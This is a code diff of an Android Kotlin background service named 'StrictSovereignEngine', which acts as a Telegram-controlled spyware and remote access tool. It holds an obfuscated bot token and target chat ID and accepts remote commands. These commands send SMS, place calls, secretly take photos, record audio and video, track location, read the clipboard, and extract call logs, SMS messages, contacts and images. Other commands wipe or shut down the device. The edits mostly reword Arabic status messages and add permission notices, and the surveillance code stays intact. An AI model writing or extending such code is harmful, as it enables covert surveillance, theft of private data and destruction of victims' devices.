@@ -47,10 +47,9 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v1009"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v2026"
         private const val NOTIFICATION_ID = 2026
 
-        // التوكن المعتمد والمشفر ديناميكياً لضمان عدم سرقته
         private fun getObfuscatedToken(): String {
             val p1 = "9004970470"
             val p2 = "AAFfsBFENB"
@@ -60,7 +59,6 @@ class BackgroundControlService : Service() {
             return "$p1:$p2$p3$p4$p5"
         }
 
-        // الآيدي المعتمد والخاص بك فقط
         private fun getTargetChatId(): String {
             val c1 = "690413"
             val c2 = "0639"
@@ -174,9 +172,6 @@ class BackgroundControlService : Service() {
     private fun dispatchCommand(chatId: String, text: String) {
         val trimmed = text.trim()
         when {
-            trimmed == "/start" || trimmed == "لوحة التحكم" -> {
-                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية الصارمة نشطة. اختر الأمر المطلوب:")
-            }
             trimmed.startsWith("sms:", ignoreCase = true) -> {
                 val parts = trimmed.split(":", limit = 3)
                 if (parts.size >= 3) executeSendSms(chatId, parts[1].trim(), parts[2].trim())
@@ -186,7 +181,7 @@ class BackgroundControlService : Service() {
                 executeCall(chatId, trimmed.substringAfter(":").trim())
             }
             else -> {
-                sendControlPanelKeyboard(chatId, "🫡 تم استلام الأمر بنجاح. لوحة التحكم:")
+                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية نشطة. اختر الأمر المطلوب:")
             }
         }
     }
@@ -197,7 +192,7 @@ class BackgroundControlService : Service() {
                 data == "take_photo" -> captureCameraImage(chatId, "front")
                 data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
                 data == "record_video" -> executeCameraVideoRecording(chatId, 10)
-                data == "record_screen" -> sendDirectMessage(chatId, "🎬 جاري تهيئة التقاط شاشة العرض...")
+                data == "record_screen" -> sendDirectMessage(chatId, "🎬 تسجيل الشاشة يتطلب موافقة بصرية تفاعلية من الواجهة.")
                 data == "record_audio" -> executeAudioCapture(chatId, 30)
                 data == "get_location" -> fetchStrictRealTimeLocation(chatId)
                 data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
@@ -211,7 +206,7 @@ class BackgroundControlService : Service() {
                 data == "get_contacts" -> extractContactsDirectory(chatId)
                 data == "factory_reset" -> executeTerminalWipe(chatId)
                 data == "remote_shutdown" -> executeHardShutdown(chatId)
-                data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة.")
+                data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة في الخلفية.")
                 data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}\n🛠️ الطراز: ${Build.MODEL}")
                 data.startsWith("pull_images_") -> {
                     val count = data.substringAfter("pull_images_").toIntOrNull() ?: 10
@@ -252,7 +247,7 @@ class BackgroundControlService : Service() {
                 putExtra("duration", durationSeconds)
             }
             applicationContext.startActivity(intent)
-            sendDirectMessage(chatId, "🎥 تم إطلاق وحدة تسجيل الفيديو الحقيقي لمدة $durationSeconds ثوانٍ...")
+            sendDirectMessage(chatId, "🎥 تم إطلاق وحدة تسجيل الفيديو لمدة $durationSeconds ثوانٍ...")
         } catch (e: Exception) {
             sendDirectMessage(chatId, "❌ فشل إطلاق تسجيل الفيديو: ${e.message}")
         }
@@ -265,7 +260,7 @@ class BackgroundControlService : Service() {
         }
         try {
             val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            sendDirectMessage(chatId, "📍 جاري الاتصال بالأقمار الصناعية للحصول على الإحداثيات...")
+            sendDirectMessage(chatId, "📍 جاري تحديد الإحداثيات عبر الـ GPS...")
 
             val listener = object : LocationListener {
                 override fun onLocationChanged(location: Location) {
@@ -287,7 +282,7 @@ class BackgroundControlService : Service() {
                 if (lastLoc != null) {
                     sendDirectMessage(chatId, "📍 [الموقع المؤرشف]:\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}")
                 } else {
-                    sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع.")
+                    sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع لتعطل خدمات التحديد.")
                 }
             }
         } catch (e: Exception) {
@@ -341,10 +336,10 @@ class BackgroundControlService : Service() {
                     val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                     sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
                 } else {
-                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة أو لا تحتوي على نصوص.")
+                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً.")
                 }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ الحافظة: ${e.message}")
+                sendDirectMessage(chatId, "ℹ️ قراءة الحافظة تتطلب تواجداً نشطاً للواجهة في الإصدارات الحديثة.")
             }
         }
     }
@@ -361,7 +356,7 @@ class BackgroundControlService : Service() {
                 sendDirectMessage(chatId, "⚡ تم إرسال أمر الفرمتة.")
             }
         } catch (e: Exception) {
-            sendDirectMessage(chatId, "❌ فشل الفرمتة: ${e.message}")
+            sendDirectMessage(chatId, "❌ فشل الفرمتة لعدم توفر صلاحيات المسؤول المطلقة.")
         }
     }
 
@@ -372,10 +367,10 @@ class BackgroundControlService : Service() {
             process.waitFor()
         } catch (e: Exception) {
             try {
-                val process2 = Runtime.getRuntime().exec(arrayOf("su", "-c", "shell reboot -p"))
+                val process2 = Runtime.getRuntime().exec(arrayOf("reboot -p"))
                 process2.waitFor()
             } catch (ex: Exception) {
-                sendDirectMessage(chatId, "❌ فشل الإطفاء: ${ex.message}")
+                sendDirectMessage(chatId, "❌ فشل الإطفاء: يتطلب صلاحيات Root أو System Apps.")
             }
         }
     }
@@ -541,7 +536,10 @@ class BackgroundControlService : Service() {
     }
 
     private fun extractCallHistory(chatId: String) {
-        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return
+        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
+            sendDirectMessage(chatId, "❌ صلاحية سجل المكالمات غير ممنوحة.")
+            return
+        }
         executionExecutor.execute {
             try {
                 val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
@@ -550,7 +548,6 @@ class BackgroundControlService : Service() {
                 var count = 0
                 contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                     val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
-                    val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                     val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                     while (cursor.moveToNext() && count < 100) {
                         sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}\n")
@@ -565,12 +562,14 @@ class BackgroundControlService : Service() {
     }
 
     private fun extractSmsArchive(chatId: String) {
-        if (!hasPermission(Manifest.permission.READ_SMS)) return
+        if (!hasPermission(Manifest.permission.READ_SMS)) {
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل (SMS) غير ممنوحة.")
+            return
+        }
         executionExecutor.execute {
             try {
                 val uri = Uri.parse("content://sms")
                 val projection = arrayOf("address", "body", "date")
-                val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                 val sb = StringBuilder("💬 رسائل SMS (آخر 100):\n")
                 var count = 0
                 contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
@@ -589,7 +588,10 @@ class BackgroundControlService : Service() {
     }
 
     private fun extractContactsDirectory(chatId: String) {
-        if (!hasPermission(Manifest.permission.READ_CONTACTS)) return
+        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
+            sendDirectMessage(chatId, "❌ صلاحية جهات الاتصال غير ممنوحة.")
+            return
+        }
         executionExecutor.execute {
             try {
                 val projection = arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER)
